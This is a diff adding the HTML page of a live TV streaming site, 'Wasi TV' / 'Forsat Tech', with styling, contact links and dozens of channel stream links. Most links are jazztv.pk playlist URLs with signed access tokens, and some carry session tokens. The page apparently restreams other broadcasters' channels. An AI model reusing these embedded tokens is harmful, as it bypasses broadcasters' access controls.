@@ -1,0 +1,632 @@
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Wasi TV</title>
+<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+		<script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
+		<style>
+			:root {
+				--hfs: 2vmax;
+				--primaryColor: red;
+				--secondaryColor: black;
+				--secondaryOpposite: white;
+			}
+			.rmp-time-total,.rmp-loaded,.rmp-handle,.rmp-current{
+                border-radius:15px!important;
+            }
+            .rmp-handle{
+                width:20px!important;
+                height:20px!important;
+            }.rmp-current{
+                padding:5px!important;
+            }.rmp-time-total{
+                border:none!important;
+            }
+			::-webkit-scrollbar {
+				width: 0em;
+				height: 0em;
+			}
+			::-webkit-scrollbar-thumb {
+				background: var(--secondaryColor);
+			}
+			::-webkit-scrollbar-track {
+				background: none;
+			}
+			* {
+				-webkit-user-select: none;
+				-moz-user-select: none;
+				-ms-user-select: none;
+				user-select: none;
+			}
+			body {
+				background-color: var(--secondaryColor);
+			}
+
+			.alignleft {
+				float: left;
+				margin-left: 5px;
+				font-weight: bold;
+				font-size: 15px;
+			}
+
+			.alignright {
+				float: right;
+				margin-right: 10px;
+				color: var(--primaryColor);
+				font-weight: normal;
+                font-size: 25px;
+			}
+
+			h4 {
+				margin-left: 5px;
+				color: var(--primaryColor);
+				font-weight: bold;
+				font-size: 15px;
+			}
+
+			.nta {
+				position: relative;
+				overflow: hidden;
+				color: var(--primaryColor);
+			}
+
+			div.scrollmenu {
+				background-color: var(--secondaryColor);
+				overflow: auto;
+				white-space: nowrap;
+				position: relative;
+				overflow-y: hidden;
+			}
+
+			div.scrollmenu a {
+				display: inline-block;
+				color: var(--secondaryOpposite);
+				text-align: center;
+				padding: 4px;
+				text-decoration: none;
+			}
+
+			div.scrollmenu a:hover {
+				background-color: var(--secondaryColor);
+			}
+
+			.cen {
+				position: relative;
+				text-align: center;
+				color: var(--secondaryOpposite);
+			}
+
+			.centered {
+				font-size: var(--hfs);
+				font-weight: bold;
+				position: absolute;
+				top: 80%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+			}
+
+			.cent {
+				font-size: auto;
+				position: absolute;
+				top: 95%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+			}
+
+			.nt {
+				width: 100px;
+				border-radius: 10px;
+				height: 120px;
+				z-index: 1;
+			}
+
+			.mnt {
+				width: 100px;
+				border-radius: 2px;
+				height: 100px;
+			}
+			.item img {
+				border-radius: 10px;
+			}
+			#content-container {
+				margin-bottom: 30px;
+			}
+			footer {
+				display: grid;
+				grid-gap: 0.5em;
+				grid-template-columns: repeat(5, minmax(10px, 1fr));
+				position: fixed;
+				bottom: 0;
+				left: 0;
+				width: 100%;
+				background-color: var(--secondaryColor);
+				padding: 0px 4px 10px;
+				justify-content: center;
+				align-items: center;
+                font-size:18px;
+			}
+			footer a {
+				text-align: center;
+				color: var(--primaryColor);
+			}
+			footer a:nth-child(3) i {
+				background: var(--primaryColor);
+				border-radius: 50%;
+				padding: 10px 10px;
+				color: var(--secondaryOpposite);
+				margin-top: -40px;
+				border: 2px solid var(--secondaryColor);
+			}
+		</style>
+
+
+<style>::-webkit-scrollbar{
+    display:none
+}
+*{
+    -ms-overflow-style:none;
+    scrollbar-width:none
+}
+body{
+    margin:0;
+    background:#f5f5f5;
+    font-family:Arial,Helvetica,sans-serif;
+    line-height:1.5;
+    color:white;
+    scroll-behavior:smooth;
+    text-align:center;
+}
+#player-wrapper{
+    width:100%;
+    z-index:999;
+}
+.sticky{
+    position:fixed;
+    top:0;
+    width:100%
+}
+#status{
+    position:fixed;
+    bottom:0;
+    right:0;
+    width:100%;
+    background:#fff;
+    display:none;
+}
+.col-sm-2{
+    border-radius:4px
+}
+.sp{
+    width:50%;
+    height:12px;
+    clear:both;
+    margin:20px auto
+}
+.sp-texture{
+    border:1px #000 solid;
+    border-radius:4px;
+    position:relative;
+    background:linear-gradient(45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent),linear-gradient(-45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent);
+    background-size:16px 16px;
+    background-position:0 0;
+    -webkit-animation:spTexture 1s infinite linear;
+    animation:spTexture 1s infinite linear;
+    color:#000;
+    text-align:center;
+    line-height:3em;
+    font-family:roboto
+}
+@-webkit-keyframes spTexture{
+    from{
+        background-position:0 0
+    }
+    to{
+        background-position:-16px 0
+    }
+}
+@keyframes spTexture{
+    from{
+        background-position:0 0
+    }
+    to{
+        background-position:-16px 0
+    }
+}
+.heading{
+    margin:5px auto;
+    text-align:center
+}
+#rmpPlayer{
+    z-index:999
+}
+.white{
+    color:#fff
+}
+.red{
+    color:red
+}
+.yellow{
+    color:#ffdd40
+}
+footer{
+    color:#fff;
+    text-align:center
+}
+footer p{
+    margin-bottom:20px;
+    margin-top:-10px
+}
+.animated{
+    font-family:sans;
+    margin:0;
+    padding:0;
+    font-size:25px;
+    background:url(https://upload.wikimedia.org/wikipedia/commons/3/3b/ColorRotateHr.gif) no-repeat;
+    background-clip:text;
+    -webkit-background-clip:text;
+    color:transparent;
+    animation:moveBg 40s linear infinite;
+    -webkit-animation:moveBg 40s linear infinite
+}
+@keyframes moveBg{
+    0%{
+        background-position:0 30%
+    }
+    100%{
+        background-position:100% 50%
+    }
+}
+.blink{
+    animation-name:blinker;
+    animation-duration:1s;
+    animation-timing-function:linear;
+    animation-iteration-count:infinite
+}
+@keyframes blinker{
+    0%{
+        opacity:1
+    }
+    50%{
+        opacity:0
+    }
+    100%{
+        opacity:1
+    }
+}
+*{
+    -webkit-touch-callout:none;
+    -webkit-user-select:none;
+    -khtml-user-select:none;
+    -moz-user-select:none;
+    -ms-user-select:none;
+    user-select:none
+}
+body{
+    background:#000!important;
+    overflow:hidden;
+    color:white;
+}
+.parent{
+    background:rgba(0,0,0,.9);
+    font-family:"Source Sans Pro",sans-serif;
+    margin:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    position:fixed;
+    top:0;
+    height:100%;
+    width:100%;
+    z-index:999999
+}
+.blobs-container{
+    display:flex
+}
+.blob img{
+    width:50%;
+    display:none;
+    margin:auto;
+    margin-top:25px
+}
+.loading{
+    color:#000;
+    display:block;
+    text-align:center;
+    position:relative;
+    top:30px;
+    left:-2px;
+    background:rgba(255,255,255,.9);
+    padding:0 10px;
+    border-radius:3px;
+    width:80%;
+    margin:auto;
+    font-size:10px
+}
+
+.print{height:75px;
+width:75px;
+border-radius:5px;
+border:1.5px solid #999;
+padding:2px;
+ margin:3px;
+ border-radius:50%;
+
+}
+.print:hover{height:75px;
+width:75px;
+border:2px solid red;
+border-radius:50px;webkit-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
+-moz-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
+box-shadow: 0px 3px 20px 3px rgba(255,0,0,100);}
+.print:active{height:75px;
+width:75px;
+border:2px solid red;
+border-radius:50px;
+webkit-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
+-moz-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
+box-shadow: 0px 3px 20px 3px rgba(0,255,0,100);}
+marquee{
+border-radius: 6px 0px 0px  6px;
+width: 90%;
+border:2px solid red;
+margin: auto;
+   font-weight:bold;
+   color:#fff;
+display: block;}
+
+.marquee span{display: inline-block;
+ background: #ff0000;
+ border-radius:  0px 6px 6px 0px;
+  padding: 0px 10px;
+   color: #fff;
+   padding:2px;
+   font-weight:bold;
+    display: inline-block;
+     float: right;
+      width: auto;
+       line-height: 35px;}
+       .marquee marquee{display: block;
+        line-height: 35px;
+         z-index: -1; 
+         margin-right: 10px;
+          width: auto; 
+          margin: auto;}
+</style>
+
+<link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css"></head><body style="overflow: auto;">
+	
+	
+		
+		</script><div class="parent" id="loader" style="display: none;"><div class="blobs-container"><div class="blob"><img id="loader-image" src=""></div></div></div><div id="player-wrapper"><div id="rmpPlayer" ></div>
+<div class="marquee yellow"><span>Info</span> <marquee scrollamount="5" direction="right" onmouseover="stop()" onmouseout="start()">Selamat Datang Di Tv Forsat Tech Saluran Tv Streaming Indonesia</marquee> </div>
+
+
+	
+	</script><h2 class="animated" align="center">Forsat Tech</h2><h4>Live Sreaming<span class="logoText">TV INDO</span></h4><div id="buttons-list" style="margin-top: 202.5px;">
+	            
+	<a href="whatsapp://send/?phone=923159493554"><img class="print" src="https://www.freepnglogos.com/uploads/whatsapp-logo-png-hd-2.png"></a>
+	
+	<a href="https://t.me/wasitvadmin"><img class="print" src="https://www.freepnglogos.com/uploads/telegram-logo-png-0.png"></a>
+	
+	<a href="https://m.me/awaispirkale554"><img class="print" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Facebook_Messenger_logo_2020.svg/2048px-Facebook_Messenger_logo_2020.svg.png"></a><br>
+ 
+
+<span url="https://rmtv-canela.amagi.tv/playlist.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSY-KL3p7WbY6b2os46QlZA4rlOwoy2qApAmA&usqp=CAU"></span>
+<span url="https://d12a2vxqkkh1bo.cloudfront.net/hls/1080p/playlist.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSFA7LkLc9KrewZbvLUEesu5P8RKgZs2TLCUQ&usqp=CAU"></span>
+<span url="http://210.210.155.35/session/f20e21fc-b254-11ec-8b66-b82a72d63267/uq2663/h/h22/index.m3u8?app_type=web&userid=50n13N0v14nd1&tkn=829341hrjhaq0q30q&chname=eGG_HD"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSn0ueG_SlbRoIufaj0hkHzW9HdOLT5Xh6rEQ&usqp=CAU"></span>
+<span url="https://d35j504z0x2vu2.cloudfront.net/v1/manifest/0bc8e8376bd8417a1b6761138aa41c26c7309312/federator/047f241e-6a2f-4d8a-baac-3d0eb93758aa/2.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsUKgaFnV8vc-onBoywAFfPAhcJHGuXuFlBg&usqp=CAU"></span>
+<span url="http://playlist.urfan.web.id/dr9445/h/h02/01.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRBOFkI9Qg2s2hpLSFtc_6YFOu9tpXNtqxmGQ&usqp=CAU"></span>
+<span url="http://210.210.155.37/session/4b46f14e-25f6-11ed-9394-96c8a394d8fc/uq2663/h/h19/01.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSblZDGr6c0PEEkIHMMtt6KzmVH2040wGrQXQ&usqp=CAU"></span>
+<span url="http://210.210.155.37/session/a95588b0-25f4-11ed-ac11-a770b9852909/uq2663/h/h192/index.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTADqQ4WDSWXH22dDlf7_P7fzLJP71b6mLRww&usqp=CAU"></span>
+<span url="http://210.210.155.37/session/a5d6f912-25f4-11ed-8b7e-a820a59dbc86/uq2663/h/h193/index.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShhkGm9Htd0Mv8IG2-9kdvWqEPmCApZcNxlA&usqp=CAU"></span>
+<span url="http://210.210.155.37/session/aeb85a58-25f4-11ed-95a3-baf8b0e78068/uq2663/h/h194/index.m3u8"><img class="print" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvck6Cv3xzJK-upKDr0Q5ZzN86fZjW4vVYFg&usqp=CAU"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/bolnews-159-3/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/bol-news-live.png?id=80"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/ltn-family-158-2/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/ltn-family-live.png?id=96"></span>
+<span url="https://cdn6.jazztv.pk:8087/jazzauth/SAMAA-173/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/samaa-tv-live.png?id=97"></span>
+<span url="https://cdn6.jazztv.pk:8087/jazzauth/ExpressNews-155/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/express-news-live.png?id=49"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/Madni-121/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/madani-channel-live.png?id=14"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/geonews-137/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/geo-news-live.png?id=42"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/bolnent-159-4/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/bol-entertainment-live.png?id=68"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/NEWS1-128/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/news-one-live.png?id=31"></span>
+<span url="https://cdn6.jazztv.pk:8087/jazzauth/Neo-110/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/neo-tv-live.png?id=99"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/public-115/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/public-news-live.png?id=15"></span>
+<span url="https://cdn6.jazztv.pk:8087/jazzauth/AAJNews-124/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/aaj-news-live.png?id=98"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/cnn-86/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/cnn-news-live.png?id=37"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/SaudiQuran-142/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/saudi-quran-makkah-tv-hd-live.png?id=33"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/SaudiSunnah-141/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/saudi-sunnah-madinah-tv-hd-live.png?id=19"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/Filmworld-126/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/filmworld-live.png?id=41"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/AbbTakNews-133/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/abb-takk-news-live.png?id=44"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/geoent-122/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/geo-entertainment-live.png?id=50"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/capitaltv-111/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/capital-tv-live.png?id=21"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/gnnnews-181/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/gnn-live.png?id=58"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/EXP-ENT-159-1/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/express-entertainment-live.png?id=94"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/TV1-129/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/tv-one-live.png?id=41"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/Urdu1-158-4/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/urdu-1-live.png?id=92"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/ApnaChannel-134/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/apna-tv-live.png?id=75"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/SeeTV-156/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/see-tv-live.png?id=96"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/AAJENT-125/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/aaj-entertainment-live.png?id=86"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/mehrantv-159-2/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/mehran-tv-logo.png?id=65"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/playtv-154/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/play-tv-live.png?id=39"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/APlus-118/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/a-plus-live.png?id=95"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/discoverypak-132/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/discover-pakistan-live-logo.png?id=77"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/metro1-175/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/metro-1-news-live.png?id=35"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/movie-one-176/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/movie-one-live.png?id=96"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/UK44-145/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/din-news-live.png?id=23"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/cartoon-network-87/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/cartoon-network-live.png?id=61"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/babytv-77/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/baby-tv-live.png?id=24"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/champion-177/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/champion-tv-live.png?id=55"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/8XM-131/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/8xm-live.png?id=57"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/JalwaTV-135/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/jalwa-tv-live.png?id=29"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/kohinoor-157-2/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/kohenoor-tv-live.png?id=98"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/24HD-146/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/channel-24-live.png?id=96"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/mashriq-109/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/mashriq-tv-live.png?id=34"></span>
